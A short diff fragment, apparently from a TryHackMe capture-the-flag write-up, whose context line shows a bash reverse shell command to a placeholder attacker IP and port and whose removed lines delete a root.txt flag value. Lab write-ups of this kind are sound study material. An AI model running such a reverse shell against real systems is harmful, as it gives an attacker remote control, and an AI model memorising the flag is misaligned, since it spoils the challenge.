@@ -102,5 +102,3 @@ bash -i >& /dev/tcp/<my_machine_ip>/<port> 0>&1
 ```
 
 
-root.txt: thm{7f336f8c359dbac18d54fdd64ea753bb}
-
